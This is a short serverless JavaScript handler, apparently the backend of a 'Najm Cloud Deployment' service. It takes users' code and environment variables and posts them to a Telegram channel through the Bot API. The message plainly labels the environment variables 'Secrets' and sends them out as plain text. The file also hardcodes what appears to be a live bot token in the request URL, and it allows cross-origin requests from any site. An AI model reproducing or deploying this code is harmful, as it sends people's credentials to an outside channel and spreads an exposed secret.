export default {
  async fetch(request, env) {
    const headers = { 
      "Access-Control-Allow-Origin": "*", 
      "Access-Control-Allow-Headers": "Content-Type", 
      "Access-Control-Allow-Methods": "POST, OPTIONS" 
    };

    if (request.method === "OPTIONS") return new Response(null, { headers });
    
    try {
      const data = await request.json();
      const { user_id, project_name, code, environment_variables } = data;

      // البصمة المخفية (Metadata) لضمان دقة البحث في المحرك v4.0
      const metadata = `---METADATA---${JSON.stringify({ uid: user_id, pid: project_name })}---METADATA---`;

      const message = `
🚀 <b>Najm Cloud Deployment</b>
👤 Developer: <code>${user_id}</code>
📦 Project: <code>${project_name}</code>

📝 <b>Code Block:</b>
<pre><code>${code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></pre>

🔐 <b>Secrets:</b>
<pre><code>${JSON.stringify(environment_variables)}</code></pre>

${metadata}
      `;

      const tgRes = await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: "@nejm_njm", 
          text: message, 
          parse_mode: "HTML" 
        })
      });

      const tgData = await tgRes.json();
      if (!tgData.ok) throw new Error(tgData.description);

      return new Response(JSON.stringify({ success: true }), { headers });
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), { 
        status: 500, 
        headers 
      });
    }
  }
};
